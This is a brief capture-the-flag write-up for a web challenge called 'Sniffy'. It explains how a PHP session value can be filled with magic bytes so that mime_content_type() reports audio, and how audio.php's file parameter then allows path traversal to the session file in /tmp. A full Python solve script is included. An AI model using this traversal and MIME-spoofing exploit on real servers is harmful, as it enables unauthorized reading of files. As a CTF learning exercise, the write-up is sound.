Sniffy

July 2024 · edited July 2025Created 2024-07-06   Updated 2025-07-141 min read · 152 words

Analysis

It appears that we are able to set $_SESSION['theme'] to any arbitrary value. We can also access files via audio.php but it does a mime check.

Attack

PHP stores its session in /tmp/sess_xxxx, so if we use path traversal to get to it, audio.php will give us the flag. But how do we pass the mime == audio check?

Mime Spoofing

We will examine how exactly does mime_content_type() work.

mime_content_type (resource|string$filename):string|false

Returns the MIME content type for a file as determined by using information from the magic.mime file.

Hah! It's a lookup file.1

Seems like we only have to place specific bytes in specific locations for this to work.

Solve Script

import requests
import urllib.parse

target = 'https://web-sniffy-d9920bbcf9df.2024.ductf.dev'
s = requests.Session()

# excerpt from php / magic.mime
'''
#audio/x-fasttracker-module
#>0 string  >\0     Title: "%s"
1080    string  8CHN        audio/x-mod
'''
for i in range(980, 1000):
    r = i*b'A' + b"8CHN"
    d = s.get(f"{target}/?theme[0]={urllib.parse.quote(r)}")
    d = s.get(f"{target}/audio.php?f=../../../../tmp/sess_{s.cookies.get('PHPSESSID')}")
    if d.status_code != 403:
        print(d.status_code, d.text)
        break
